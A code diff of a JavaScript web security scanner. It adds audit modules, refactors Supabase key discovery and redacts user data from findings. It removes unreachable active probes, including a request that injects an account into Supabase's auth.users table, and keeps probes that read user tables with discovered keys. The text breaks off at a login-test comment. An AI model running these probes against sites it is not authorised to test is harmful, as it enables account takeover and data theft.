@@ -1,7 +1,20 @@
+import { probeTls, weakTlsCiphers } from './src/core/tls-probes.js';
+import { auditWordpressRoutes } from './src/core/wordpress-api.js';
+import { lookupDmarc } from './src/core/dns-policy.js';
+import { captureWebSockets } from './src/core/websocket-discovery.js';
+import { auditObjectAuthorization } from './src/core/authorization-audit.js';
+import { recordAuditCheck, publicClientSources } from './src/core/audit-checks.js';
+import { inspectPublicObject, objectUrl } from './src/core/storage-audit.js';
+import { auditObservedQueries } from './src/core/observed-api.js';
+import { createLoginProbe, auditLoginForm, discoverLoginPage } from './src/core/login-audit.js';
+import { auditReflectedXss, auditInputParameters } from './src/core/parameter-audit.js';
+import { createSurfaceInventory, collectPageSurfaces } from './src/core/surfaces.js';
+import { analyzeBundleExposure, secretFindingPolicy } from './src/core/detectors/bundle-secrets.js';
+import { discoverSupabase, supabaseHeaders } from './src/core/supabase-config.js';
+import { cspScriptPolicy, metaCsp, hasFrameRestriction } from './src/core/detectors/policies.js';
 import chalk from 'chalk';
 import ora from 'ora';
 import inquirer from 'inquirer';
-import puppeteer from 'puppeteer';
 import { getViceDataDir } from './src/utils/paths.js';
 import {
   ALL_MODULES,
@@ -12,11 +25,11 @@ import {
 } from './src/core/modules.js';
 import { createScanMetrics } from './src/core/metrics.js';
 import { classifyCorsPolicy } from './src/core/detectors/cors.js';
+import { detectAnalyticsStack, recordStackSource, stackSourceLocation } from './src/core/detectors/stack.js';
 import { classifyCsrfEvidence, classifyStoredInputSurface } from './src/core/detectors/forms.js';
 import { classifyHardeningSignal } from './src/core/detectors/hardening.js';
 import { classifyPublicJson } from './src/core/detectors/public-json.js';
-import { classifyAuthenticatedSupabaseRead, classifySupabaseRead, COMMON_SENSITIVE_TABLE_CANDIDATES, extractSupabaseTableCandidates, normalizeSupabaseSchemaTables } from './src/core/detectors/supabase.js';
-import { classifySignupResponse } from './src/core/detectors/signup.js';
+import { classifySupabaseRead, COMMON_SENSITIVE_TABLE_CANDIDATES, extractSupabaseTableCandidates, normalizeSupabaseSchemaTables } from './src/core/detectors/supabase.js';
 import { classifySupabaseJwt, extractAssignedSecretValue, isPlaceholderSecret, isPublicSupabaseAnonMatch, SECRET_PATTERNS } from './src/utils/patterns.js';
 import { createHttpClient, safeFetch, withHttpClient } from './src/core/http-client.js';
 import { mapWithConcurrency } from './src/core/concurrency.js';
@@ -25,8 +38,6 @@ import { classifySetCookie, getSetCookieHeaders } from './src/core/detectors/coo
 import { analyzeSourceMap } from './src/core/detectors/source-map.js';
 import { classifyGraphqlAliasResponse, classifyGraphqlBatchResponse, classifyGraphqlDepthResponse } from './src/core/detectors/graphql.js';
 import { classifyTlsAuthorization, classifyTlsPublicKey } from './src/core/detectors/tls.js';
-import { classifyTimingSamples } from './src/core/detectors/timing.js';
-import { classifyRateLimitEvidence } from './src/core/detectors/rate-limit.js';
 import { analyzeJwt, findJwtCandidates } from './src/core/detectors/jwt.js';
 import { summarizeCoverage } from './src/core/coverage.js';
 import { escapeHtml } from './src/core/reporter/escape.js';
@@ -35,12 +46,13 @@ import { createScopePolicy } from './src/core/scope.js';
 import { installScopedRequestInterception } from './src/core/browser-scope.js';
 import { appendFinding } from './src/core/findings.js';
 import { calculateScore as calculateCoreScore } from './src/core/score.js';
+import { gradeForScore, scorePresentation } from './src/core/score-policy.js';
 import { ENGINE_VERSION, RULESET_VERSION, SCORING_VERSION } from './src/core/version.js';
 import { classifySensitiveFile } from './src/core/detectors/sensitive-file.js';
 import { classifyHttpOnlySubdomain, classifyOpenService } from './src/core/detectors/open-service.js';
 import { classifyDkimSearch } from './src/core/detectors/dns-email.js';
+import { dnsPolicyOutcome } from './src/core/check-outcomes.js';
 import { classifyWordpressSurface } from './src/core/detectors/wordpress.js';
-import { createSupabaseCanary } from './src/core/canary.js';
 import { classifyUnauthenticatedApiResponse, findMassAssignmentSurfaces } from './src/core/detectors/api-schema.js';
 import { classifyTraceResponse } from './src/core/detectors/http-methods.js';
 import { classifyWebSocketMessages, redactWebSocketUrl } from './src/core/detectors/websocket.js';
@@ -145,14 +157,17 @@ function addFinding(severity, module, title, detail, recommendation, metadata = 
 }
 
 async function launchBrowser() {
+  const { default: puppeteer } = await import('puppeteer');
   const context = getScanContext();
   if (context?.signal?.aborted) throw context.signal.reason || new Error('scan_cancelled');
   const args = ['--disable-dev-shm-usage'];
   if (process.env.VICE_DISABLE_CHROMIUM_SANDBOX === '1') {
     args.push('--no-sandbox', '--disable-setuid-sandbox');
   }
-  const browser = await puppeteer.launch({ headless: true, args });
-  if (context) {
+  const browser = await (context
+    ? context.browserProcess ||= puppeteer.launch({ headless: true, args })
+    : puppeteer.launch({ headless: true, args }));
+  if (context && !context.browsers.has(browser)) {
     context.browsers.add(browser);
     if (context.signal) {
       context.signal.addEventListener('abort', () => {
@@ -160,7 +175,12 @@ async function launchBrowser() {
       }, { once: true });
     }
   }
-  return browser;
+  const isolated = await browser.createBrowserContext();
+  return {
+    newPage: () => isolated.newPage(),
+    createBrowserContext: () => browser.createBrowserContext(),
+    close: () => isolated.close(),
+  };
 }
 
 async function createBrowserPage(browser, baseUrl, options = {}) {
@@ -169,6 +189,7 @@ async function createBrowserPage(browser, baseUrl, options = {}) {
   if (context?.scope) {
     await installScopedRequestInterception(page, {
       scope: context.scope,
+      loginProbe: options.loginProbe,
       signal: context.signal,
       metrics: context.browserMetrics,
       authHeaders: options.authenticated ? context.authContext?.headers : null,
@@ -206,7 +227,11 @@ async function crawlWithHttpFallback(baseUrl, spinner, reportFindings) {
   if (!response || response.status < 200 || response.status >= 400) throw new Error(`Unable to retrieve ${baseUrl}`);
 
   const html = (await response.text()).slice(0, DISCOVERY_BUDGETS.sourceCharacters);
+  const inventory = getScanContext().surfaces ||= createSurfaceInventory(baseUrl);
+  inventory.addRequest(response.url || baseUrl, { contentType: response.headers.get('content-type') });
+  for (const link of html.matchAll(/<a\b[^>]*\bhref=["']([^"']+)["']/gi)) inventory.addPage(link[1], 1);
   const sources = [html];
+  recordStackSource(getScanContext(), html, response.url || baseUrl, 'HTML');
   const scriptUrls = new Set();
   const assetPattern = /<(?:script\b[^>]*\bsrc|link\b[^>]*\brel=["']modulepreload["'][^>]*\bhref)\s*=\s*["']([^"']+)["']/gi;
   let match;
@@ -219,7 +244,9 @@ async function crawlWithHttpFallback(baseUrl, spinner, reportFindings) {
     const scriptResponse = await safeFetch(scriptUrl);
     if (!scriptResponse || scriptResponse.status !== 200) continue;
     const source = await scriptResponse.text().catch(() => '');
-    if (source.length > 10) boundedPush(sources, source.slice(0, DISCOVERY_BUDGETS.sourceCharacters), DISCOVERY_BUDGETS.scriptSources);
+    if (source.length > 10 && boundedPush(sources, source.slice(0, DISCOVERY_BUDGETS.sourceCharacters), DISCOVERY_BUDGETS.scriptSources)) {
+      recordStackSource(getScanContext(), source, scriptResponse.url || scriptUrl);
+    }
   }
 
   getScanContext()?.limitations?.add('browser_crawl_unavailable');
@@ -230,6 +257,7 @@ async function crawlWithHttpFallback(baseUrl, spinner, reportFindings) {
 }
 
 async function crawlAndExtract(baseUrl, spinner, options = {}) {
+  const inventory = getScanContext().surfaces ||= createSurfaceInventory(baseUrl);
   const reportFindings = options.reportFindings !== false;
   const navigationTimeoutMs = Math.max(1000, Math.min(options.timeoutMs ?? 10000, 30000));
   spinner.text = 'Launching headless browser...';
@@ -247,6 +275,7 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
   }
 
   const page = await createBrowserPage(browser, baseUrl, { authenticated: true });
+  await captureWebSockets(page, getScanContext());
   await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
 
   // Intercept all JS requests loaded by the browser
@@ -254,11 +283,12 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
   const capturedScriptUrls = new Set();
   const pendingScriptReads = new Set();
   const scriptContents = [];
-  const addScriptSource = source => boundedPush(
-    scriptContents,
-    String(source || '').slice(0, DISCOVERY_BUDGETS.sourceCharacters),
-    DISCOVERY_BUDGETS.scriptSources,
-  );
+  const addScriptSource = (source, url = baseUrl, kind = 'JS', observed = false) => {
+    const content = String(source || '').slice(0, DISCOVERY_BUDGETS.sourceCharacters);
+    if (!boundedPush(scriptContents, content, DISCOVERY_BUDGETS.scriptSources)) return false;
+    recordStackSource(getScanContext(), content, url, kind, observed);
+    return true;
+  };
 
   const captureScriptResponse = async (response) => {
     try {
@@ -268,7 +298,7 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
         if (!scriptUrls.has(url) && boundedAdd(scriptUrls, url, DISCOVERY_BUDGETS.scriptUrls)) {
           const text = await response.text().catch(() => '');
           if (text.length > 10) {
-            addScriptSource(text);
+            addScriptSource(text, url, 'JS', response.status() === 200 && response.request().resourceType() === 'script');
             capturedScriptUrls.add(url);
           }
         }
@@ -281,6 +311,11 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
     }
   };
   page.on('response', (response) => {
+    const observedRequest = response.request();
+    if (['xhr', 'fetch', 'document'].includes(observedRequest.resourceType())) {
+      inventory.addRequest(response.url(), { method: observedRequest.method(), body: observedRequest.postData(), authenticated: Boolean(getScanContext()?.authContext), contentType: response.headers()['content-type'] });
+    }
+
     const task = captureScriptResponse(response);
     pendingScriptReads.add(task);
     task.finally(() => pendingScriptReads.delete(task));
@@ -302,7 +337,7 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
 
   // Wait a bit for lazy-loaded scripts
   spinner.text = 'Waiting for dynamic scripts to load...';
-  await new Promise(r => setTimeout(r, 3000));
+  await page.waitForNetworkIdle({ idleTime: 250, timeout: 1500 }).catch(() => {});
 
   // Scroll to trigger lazy-loads
   spinner.text = 'Scrolling the page to trigger lazy-loads...';
@@ -313,14 +348,14 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
     }
     window.scrollTo(0, 0);
   });
-  await new Promise(r => setTimeout(r, 2000));
+  await page.waitForNetworkIdle({ idleTime: 250, timeout: 1500 }).catch(() => {});
   await drainScriptReads();
 
   // Retrieve the fully rendered DOM
   spinner.text = 'Extracting the rendered DOM...';
   const html = (await page.content()).slice(0, DISCOVERY_BUDGETS.sourceCharacters);
   const domText = await page.evaluate(limit => document.documentElement.innerHTML.slice(0, limit), DISCOVERY_BUDGETS.sourceCharacters);
-  addScriptSource(domText);
+  addScriptSource(domText, page.url(), 'Rendered HTML');
 
   // Retrieve inline scripts from the DOM
   const inlineScripts = await page.evaluate(() => {
@@ -329,7 +364,9 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
       .map(s => s.textContent.slice(0, 512 * 1024))
       .filter(t => t && t.length > 10);
   });
-  for (const inlineScript of inlineScripts) addScriptSource(inlineScript);
+  for (const [index, inlineScript] of inlineScripts.entries()) {
+    addScriptSource(inlineScript, page.url(), `Inline script ${index + 1}`);
+  }
 
   // Browser response events are asynchronous and can otherwise finish after
   // the analysis starts. Fetch declared bundles deterministically as a fallback.
@@ -347,7 +384,7 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
     if (!scriptResponse || scriptResponse.status !== 200) continue;
     const text = await scriptResponse.text().catch(() => '');
     if (text.length > 10) {
-      addScriptSource(text);
+      addScriptSource(text, scriptResponse.url || scriptUrl);
       capturedScriptUrls.add(scriptUrl);
     }
   }
@@ -385,9 +422,6 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
         }
       }
     }
-    // Add storage content to scripts for later secret-pattern matching
-    addScriptSource('LOCALSTORAGE: ' + JSON.stringify(storage.local));
-    addScriptSource('SESSIONSTORAGE: ' + JSON.stringify(storage.session));
   } catch {}
 
   // ── Subresource Integrity check on external scripts ──
@@ -465,6 +499,10 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
     } catch {}
   }
 
+  await collectPageSurfaces(page, inventory);
+  const landingEntry = inventory.pages.get(baseUrl);
+  if (landingEntry) landingEntry.visited = true;
+
   // Extract internal links
   const pageUrls = await page.evaluate((origin) => {
     return [...document.querySelectorAll('a[href]')]
@@ -476,12 +514,21 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
   // Test source maps
   if (reportFindings) spinner.text = 'Checking source maps...';
   for (const scriptUrl of reportFindings ? scriptUrls : []) {
-    if (!scriptUrl.endsWith('.js')) continue;
-    const mapUrl = scriptUrl + '.map';
+    const source = getScanContext()?.stackSources?.find(record => record.url === scriptUrl)?.content || '';
+    const reference = source.match(/[#@]\s*sourceMappingURL=([^\s*]+)/)?.[1];
+    const mapUrl = reference ? new URL(reference, scriptUrl).href : `${scriptUrl.split('?')[0]}.map`;
+    if (!await authorizeDiscoveredDestination(mapUrl)) continue;
     const mapRes = await safeFetch(mapUrl);
     if (mapRes && mapRes.status === 200) {
-      const sourceMap = analyzeSourceMap(await mapRes.text());
+      const mapText = await mapRes.text();
+      const sourceMap = analyzeSourceMap(mapText);
       if (!sourceMap) continue;
+      try {
+        const parsedMap = JSON.parse(mapText);
+        for (const content of (parsedMap.sourcesContent || []).slice(0, 20)) {
+          if (typeof content === 'string') addScriptSource(content, mapUrl, 'Source map');
+        }
+      } catch {}
       const secretDetail = sourceMap.secretTypes.length > 0 ? `\nCredential types: ${sourceMap.secretTypes.join(', ')}` : '';
       const pathDetail = sourceMap.sensitiveSources.length > 0 ? `\nSensitive source paths: ${sourceMap.sensitiveSources.join(', ')}` : '';
       const title = sourceMap.kind === 'credentials'
@@ -533,19 +580,26 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
   // Crawl a few internal pages for more coverage:
   // 1) sub-pages found in <a> links
   // 2) paths discovered from robots.txt / sitemap.xml
-  const linkPages = [...new Set(pageUrls)].slice(0, 5);
-  const robotsPages = [...discoveredPaths].slice(0, 5).map(p => origin + (p.startsWith('/') ? p : '/' + p));
-  const subPages = [...new Set([...linkPages, ...robotsPages])];
-  if (subPages.length > 0) {
-    spinner.text = `Crawling ${subPages.length} internal pages...`;
-    for (const subUrl of subPages) {
-      try {
-        await page.goto(subUrl, { waitUntil: 'domcontentloaded', timeout: navigationTimeoutMs });
-        await new Promise(r => setTimeout(r, 2000));
-        const subDom = await page.evaluate(limit => document.documentElement.innerHTML.slice(0, limit), DISCOVERY_BUDGETS.sourceCharacters);
-        addScriptSource(subDom);
-      } catch {}
-    }
+  const protectedEntry = getScanContext()?.authentication?.available
+    ? getScanContext().authentication.verificationUrl : null;
+  if (protectedEntry) inventory.addPage(protectedEntry);
+  for (const path of discoveredPaths) inventory.addPage(new URL(path, origin).href);
+  let visits = 0;
+  const maxPageVisits = options.maxPages ?? 16;
+  while (visits++ < maxPageVisits) {
+    const entry = inventory.nextPage();
+    if (!entry || getScanContext()?.signal?.aborted) break;
+    entry.visited = true;
+    try {
+      spinner.text = `Exploring application route ${visits}/${maxPageVisits}...`;
+      const routeResponse = await page.goto(entry.url, { waitUntil: 'domcontentloaded', timeout: navigationTimeoutMs });
+      if (entry.url === protectedEntry && routeResponse?.status() >= 400) getScanContext()?.limitations.add('authenticated_session_crawl_failed');
+      await page.waitForNetworkIdle({ idleTime: 250, timeout: 1500 }).catch(() => {});
+      await collectPageSurfaces(page, inventory, entry.depth);
+      const subDom = await page.evaluate(limit => document.documentElement.innerHTML.slice(0, limit), DISCOVERY_BUDGETS.sourceCharacters);
+      addScriptSource(subDom, page.url(), 'Rendered HTML');
+      if (entry.url === protectedEntry && /<input[^>]+type=["']password/i.test(subDom)) getScanContext()?.limitations.add('authenticated_session_crawl_failed');
+    } catch { getScanContext()?.limitations.add('route_crawl_failed'); }
   }
   await drainScriptReads();
 
@@ -557,9 +611,10 @@ async function crawlAndExtract(baseUrl, spinner, options = {}) {
 
 // ──────────── MODULE 2 : JS Analysis ────────────
 
-function analyzeScripts(jsContents, spinner) {
+async function analyzeScripts(jsContents, spinner) {
   spinner.text = 'Analyzing secrets in JS files...';
   const found = new Map();
+  const secretSources = await publicClientSources(jsContents, getScanContext(), safeFetch);
 
   // Track already seen JWTs to avoid anon/service_role duplicates
   const seenJwts = new Set();
@@ -570,7 +625,7 @@ function analyzeScripts(jsContents, spinner) {
   // API Key just because it sits next to `apiKey:`.
   const specificMatches = new Set();
 
-  for (const js of jsContents) {
+  for (const js of secretSources) {
     for (const token of findJwtCandidates(js)) {
       if (analyzedJwts.has(token)) continue;
       analyzedJwts.add(token);
@@ -662,15 +717,7 @@ function analyzeScripts(jsContents, spinner) {
             if (pattern.name !== 'Generic API Key' && pattern.name !== 'Generic Secret') {
               specificMatches.add(extractAssignedSecretValue(match));
             }
-            let sev = 'ELEVEE';
-            if (pattern.name.includes('Private') || pattern.name === 'Stripe Secret Key' || pattern.name === 'AWS Secret Key') {
-              sev = 'CRITIQUE';
-            } else if (pattern.name.includes('Publishable') || pattern.name === 'Firebase API Key' || pattern.name === 'Google OAuth') {
-              sev = 'FAIBLE';
-            } else if (pattern.name === 'Generic API Key' || pattern.name === 'Generic Secret') {
-              sev = 'MOYENNE';
-            }
-
+            const secretPolicy = secretFindingPolicy(pattern.name);
             const recoMap = {
               'Firebase API Key': 'The Firebase key is public by design, but verify Firebase security rules',
               'Stripe Publishable Key': 'The publishable key is designed to be public. Verify that the SECRET key is not exposed.',
@@ -679,7 +726,7 @@ function analyzeScripts(jsContents, spinner) {
             };
             const reco = recoMap[pattern.name] || 'Move this value to server-side environment variables, never expose secrets in the client bundle';
 
-            addFinding(sev, 'Secrets', `${pattern.name} detected`, `Value: ${match}`, reco);
+            addFinding(secretPolicy.severity, 'Secrets', `${pattern.name} detected`, `Value: ${match}`, reco, secretPolicy);
           }
         }
       }
@@ -792,9 +839,12 @@ async function checkSensitivePaths(baseUrl, spinner) {
   const fakeType = fakeRes?.headers.get('content-type')?.split(';', 1)[0].trim().toLowerCase() || '';
   const fakeIsCatchAll = fakeRes?.status === 200;
 
-  const checks = await mapWithConcurrency(SENSITIVE_PATHS, 6, async (path, index) => {
+  const origin = new URL(baseUrl).origin;
+  const directories = [...new Set(['/', new URL(baseUrl).pathname.replace(/[^/]*$/, '')])];
+  const paths = [...new Set(directories.flatMap(directory => SENSITIVE_PATHS.map(path => `${directory.replace(/\/$/, '')}${path}`)))];
+  const checks = await mapWithConcurrency(paths, 6, async (path, index) => {
     spinner.text = `Sensitive files [${index + 1}/${SENSITIVE_PATHS.length}] ${path}`;
-    const url = baseUrl.replace(/\/+$/, '') + path;
+    const url = origin + path;
     const res = await safeFetch(url);
     if (!res || res.status !== 200) return null;
 
@@ -807,8 +857,8 @@ async function checkSensitivePaths(baseUrl, spinner) {
     // If the size is close to the fake-404 or the home page, treat as SPA catch-all.
     // Threshold widened to 250 bytes because i18n SPAs (Next.js, Nuxt) vary the
     // shell content slightly per route while still serving the same app shell.
-    if (fakeIsCatchAll && fakeSize > 0 && mediaType === fakeType && Math.abs(body.length - fakeSize) < 250) return null;
-    if (homeSize > 0 && mediaType === homeType && Math.abs(body.length - homeSize) < 250) return null;
+    if (fakeIsCatchAll && fakeSize > 0 && mediaType === fakeType && Math.abs(body.length - fakeSize) < 250 && !classifySensitiveFile(path, body, mediaType)) return null;
+    if (homeSize > 0 && mediaType === homeType && Math.abs(body.length - homeSize) < 250 && !classifySensitiveFile(path, body, mediaType)) return null;
     // HTML response on a path that should never be HTML => SPA catch-all.
     const looksNonHtml = /\.(?:env|json|sh|key|pem|sql|conf|cfg|log|bak|asp|aspx|jsp|cgi)(?:\.[a-z0-9]+)?$|\/\.git\/|\/\.htaccess$|\/\.DS_Store$|\/server\.(?:js|ts|py|php|rb|go)$/i.test(path);
     if (contentType.includes('text/html') && looksNonHtml) return null;
@@ -900,19 +950,9 @@ async function auditSupabase(jsContents, spinner, provided = null) {
   // Caller-supplied credentials (supabase-deep) take precedence over discovery.
   // This lets the deep scan test a project by its explicit URL + anon key even
   // when the target's public bundle does not expose them.
-  let supabaseUrl = provided?.url || null;
-  let anonKey = provided?.key || null;
-
-  for (const js of jsContents) {
-    if (!supabaseUrl) {
-      const urlMatch = js.match(/https?:\/\/[a-z0-9\-]+\.supabase\.co/i);
-      if (urlMatch) supabaseUrl = urlMatch[0];
-    }
-    if (!anonKey) {
-      const keyMatches = js.match(/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g) || [];
-      anonKey = keyMatches.find((key) => classifySupabaseJwt(key) === 'anon') || null;
-    }
-  }
+  const discovered = discoverSupabase(jsContents, provided);
+  const supabaseUrl = discovered.url;
+  const anonKey = discovered.key;
 
   if (!supabaseUrl) {
     addFinding('INFO', 'Supabase', 'No Supabase URL detected', 'No Supabase configuration found in client code', '');
@@ -922,6 +962,7 @@ async function auditSupabase(jsContents, spinner, provided = null) {
   addFinding('INFO', 'Supabase', 'Supabase URL found', supabaseUrl, 'The Supabase URL is public by design, but verify that RLS is in place');
 
   if (!anonKey) {
+    getScanContext()?.limitations.add('supabase_public_key_unavailable');
     addFinding('INFO', 'Supabase', 'Anon key not found', 'Cannot test RLS without anon key', '');
     return { tablesTested: 0, inventoryComplete: false, scoreAvailable: false };
   }
@@ -931,14 +972,13 @@ async function auditSupabase(jsContents, spinner, provided = null) {
     return { tablesTested: 0, inventoryComplete: false, scoreAvailable: false };
   }
 
-  if (classifySupabaseJwt(anonKey) === 'service_role') {
+  if (classifySupabaseJwt(anonKey) === 'service_role' || anonKey.startsWith('sb_secret_')) {
     addFinding('CRITIQUE', 'Supabase', 'Service role key supplied for anon audit', 'A service-role key bypasses RLS, so using it would make every access result invalid.', 'Replace it with the public anon key and rotate the service-role key if it was exposed client-side.');
     return { tablesTested: 0, inventoryComplete: false, scoreAvailable: false };
   }
 
   const headers = {
-    'apikey': anonKey,
-    'Authorization': `Bearer ${anonKey}`,
+    ...supabaseHeaders(anonKey),
   };
   const clientTables = extractSupabaseTableCandidates(jsContents);
   const tables = new Set(clientTables);
@@ -992,7 +1032,7 @@ async function auditSupabase(jsContents, spinner, provided = null) {
         const exposure = classifySupabaseRead(table, data);
         if (!exposure) continue;
         const paths = exposure.paths.length > 0 ? `\nSensitive field paths: ${exposure.paths.join(', ')}` : '';
-        addFinding(exposure.severity, 'Supabase RLS', exposure.title, `Table ${table} returns ${data.length} row(s) with the anon key.${paths}`, `Review SELECT policies and expose only fields intended for public access on "${table}".`, { classification: 'confirmed', confidence: 'high', rule_id: 'vice/rls/anonymous-read' });
+        addFinding(exposure.severity, 'Supabase RLS', exposure.title, `Table ${table} returns ${data.length} row(s) with the anon key.${paths}`, `Review SELECT policies and expose only fields intended for public access on "${table}".`, { classification: exposure.paths.length ? 'confirmed' : 'heuristic', confidence: exposure.paths.length ? 'high' : 'low', rule_id: 'vice/rls/anonymous-read' });
       } else {
         emptyTables.push(table);
       }
@@ -1048,29 +1088,8 @@ async function auditSupabase(jsContents, spinner, provided = null) {
 async function auditAuthInjection(jsContents, spinner) {
   spinner.text = 'Searching for Supabase configuration for auth test...';
 
-  let supabaseUrl = null;
-  let anonKey = null;
-  let serviceRoleKey = null;
-
-  for (const js of jsContents) {
-    const urlMatch = js.match(/https?:\/\/[a-z0-9\-]+\.supabase\.co/i);
-    if (urlMatch && !supabaseUrl) supabaseUrl = urlMatch[0];
-
-    // Collect all found JWTs
-    const jwtMatches = js.match(/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g);
-    if (jwtMatches) {
-      for (const jwt of jwtMatches) {
-        try {
-          const payload = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
-          if (payload.role === 'service_role') {
-            serviceRoleKey = jwt;
-          } else if (payload.role === 'anon' && !anonKey) {
-            anonKey = jwt;
-          }
-        } catch {}
-      }
-    }
-  }
+  const { url: supabaseUrl, key: anonKey } = discoverSupabase(jsContents);
+  const serviceRoleKey = jsContents.flatMap(source => source.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g) || []).find(key => classifySupabaseJwt(key) === 'service_role');
 
   if (!supabaseUrl) {
     addFinding('INFO', 'Auth Injection', 'No Supabase URL - test skipped', '', '');
@@ -1102,8 +1121,7 @@ async function auditAuthInjection(jsContents, spinner) {
     // Attempt via the auth schema
     const authUsersRes = await safeFetch(`${supabaseUrl}/rest/v1/users?select=*&limit=5`, {
       headers: {
-        'apikey': key,
-        'Authorization': `Bearer ${key}`,
+        ...supabaseHeaders(key),
         'Accept-Profile': 'auth',
       }
     });
@@ -1111,9 +1129,8 @@ async function auditAuthInjection(jsContents, spinner) {
     if (authUsersRes && authUsersRes.status === 200) {
       let data;
       try { data = await authUsersRes.json(); } catch { data = null; }
-      if (Array.isArray(data) && data.length > 0) {
-        const emails = data.map(u => u.email || u.id).join(', ');
-        addFinding('CRITIQUE', 'Auth Injection', `Table auth.users READABLE with ${label}`, `Users found: ${emails}`, 'The auth.users table must NEVER be accessible via the REST API. Check grants on the auth schema and RLS.');
+      if (Array.isArray(data) && data.some(user => user?.id && user?.email)) {
+        addFinding('CRITIQUE', 'Auth Injection', `Table auth.users READABLE with ${label}`, 'Anonymous access returned user identifiers and email fields from the auth schema. Values omitted.', 'Restrict access to the auth schema and review its grants.', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/supabase/auth-users-read', cause_key: 'supabase-auth-users' });
       }
     }
 
@@ -1121,8 +1138,7 @@ async function auditAuthInjection(jsContents, spinner) {
     for (const tableName of ['users', 'profiles', 'accounts']) {
       const pubRes = await safeFetch(`${supabaseUrl}/rest/v1/${tableName}?select=*&limit=5`, {
         headers: {
-          'apikey': key,
-          'Authorization': `Bearer ${key}`,
+          ...supabaseHeaders(key),
         }
       });
 
@@ -1130,180 +1146,13 @@ async function auditAuthInjection(jsContents, spinner) {
         let data;
         try { data = await pubRes.json(); } catch { data = null; }
         if (Array.isArray(data) && data.length > 0) {
-          const cols = Object.keys(data[0]).join(', ');
-          const hasEmail = cols.includes('email');
-          const hasPassword = cols.includes('password') || cols.includes('hash') || cols.includes('encrypted');
-          let sev = 'ELEVEE';
-          let extra = '';
-          if (hasPassword) {
-            sev = 'CRITIQUE';
-            extra = ' - CONTAINS PASSWORD DATA';
-          }
-          addFinding(sev, 'Auth Injection', `Table "${tableName}" readable with ${label}${extra}`, `Exposed columns: ${cols}\nData: ${JSON.stringify(data[0])}`, `Enable RLS and restrict visible columns on "${tableName}"`);
+          const exposure = classifySupabaseRead(tableName, data);
+          if (exposure) addFinding(exposure.severity, 'Auth Injection', exposure.title,
+            `Anonymous read. Sensitive paths: ${exposure.paths.join(', ')}. Row values omitted.`,
+            'Review the fields and SELECT policies intended for anonymous callers.',
+            { rule_id: 'vice/rls/anonymous-read', classification: exposure.paths.length ? 'probable' : 'informational', confidence: exposure.paths.length ? 'medium' : 'high' });
         }
       }
-    }
-  }
-
-  addFinding('INFO', 'Auth Injection', 'Active auth mutation probes skipped', 'The audit did not create accounts, inject rows, or attempt password login. Read-only schema and RLS checks remain active.', '', { classification: 'confirmed', confidence: 'high', rule_id: 'vice/auth/non-destructive-mode' });
-  return;
-
-  // ── CHECK 3 : Open signup - unrestricted account creation ──
-  spinner.text = 'Testing open signup...';
-  const signupCanary = createSupabaseCanary(supabaseUrl, 'audit');
-  const injectionCanary = createSupabaseCanary(supabaseUrl, 'injection');
-  const testEmail = signupCanary.email;
-  const injectionEmail = injectionCanary.email;
-  const testPassword = signupCanary.password;
-
-  const signupRes = await safeFetch(`${supabaseUrl}/auth/v1/signup`, {
-    method: 'POST',
-    headers: {
-      'apikey': anonKey,
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      email: testEmail,
-      password: testPassword,
-    }),
-  });
-
-  if (signupRes) {
-    const status = signupRes.status;
-    let body;
-    try { body = await signupRes.json(); } catch { body = {}; }
-
-    const signal = classifySignupResponse(status, body);
-    if (signal) {
-      addFinding(
-        signal.severity,
-        'Auth Injection',
-        signal.title,
-        `Status ${status}. Canary account: ${testEmail}. Immediate session: ${signal.kind === 'immediate-session' ? 'yes' : 'no'}.`,
-        signal.kind === 'immediate-session' ? 'Confirm that public signup is intended and protected against automation.' : '',
-        { classification: signal.classification, confidence: signal.confidence, rule_id: `vice/auth/signup-${signal.kind}` },
-      );
-    }
-  }
-
-  // ── CHECK 4 : Direct injection into auth.users via REST ──
-  spinner.text = 'Attempting direct injection into auth.users...';
-
-  for (const { key, label } of keysToTest) {
-    const injectRes = await safeFetch(`${supabaseUrl}/rest/v1/users`, {
-      method: 'POST',
-      headers: {
-        'apikey': key,
-        'Authorization': `Bearer ${key}`,
-        'Content-Type': 'application/json',
-        'Accept-Profile': 'auth',
-        'Prefer': 'return=representation',
-      },
-      body: JSON.stringify({
-        instance_id: '00000000-0000-0000-0000-000000000000',
-        email: injectionEmail,
-        encrypted_password: '$2a$10$PBPVTGj2mXoLbn4nhBOYhuXGp1E5KFkyrQKCqbcSm0hOxwDmMOsta',
-        email_confirmed_at: new Date().toISOString(),
-        role: 'authenticated',
-        aud: 'authenticated',
-      }),
-    });
-
-    if (injectRes) {
-      const status = injectRes.status;
-      let body;
-      try { body = await injectRes.json(); } catch { body = {}; }
-
-      if (status === 201 || status === 200) {
-        addFinding('CRITIQUE', 'Auth Injection', `INJECTION INTO auth.users SUCCEEDED with ${label}`, `A user was injected directly into auth.users!\nResponse: ${JSON.stringify(body)}`, 'URGENT: The auth schema is writable. Immediately revoke INSERT grants on auth.users for anon/authenticated roles.');
-      } else if (status === 401 || status === 403 || status === 404) {
-        addFinding('INFO', 'Auth Injection', `auth.users injection blocked with ${label}`, `Status ${status} - access denied`, '');
-      }
-    }
-  }
-
-  // ── CHECK 5 : Login test with test credentials ──
-  spinner.text = 'Checking if the test account is exploitable...';
